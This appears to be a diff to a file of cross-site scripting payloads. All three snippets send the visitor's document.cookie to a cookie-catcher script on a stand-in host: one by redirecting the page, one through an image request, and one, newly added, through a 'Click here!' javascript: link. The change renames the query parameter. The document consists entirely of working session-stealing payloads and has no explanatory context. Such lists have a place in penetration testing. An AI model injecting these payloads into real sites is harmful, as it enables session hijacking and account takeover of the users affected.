@@ -1,8 +1,9 @@
 <script>
-document.location= "http://www.example.com/cookie_catcher.php?c=" + document.cookie
+document.location= "http://www.example.com/cookie_catcher.php?cookie=" + document.cookie
 </script>
 
 <script>
-new Image().src="http://www.example.com/cookie_catcher.php?c="+encodeURI(document.cookie);
+new Image().src="http://www.example.com/cookie_catcher.php?cookie="+encodeURI(document.cookie);
 </script>
 
+<a href="javascript:document.location='http://www.example.com/cookie_catcher.php?cookie='+document.cookie;">Click here!</a>
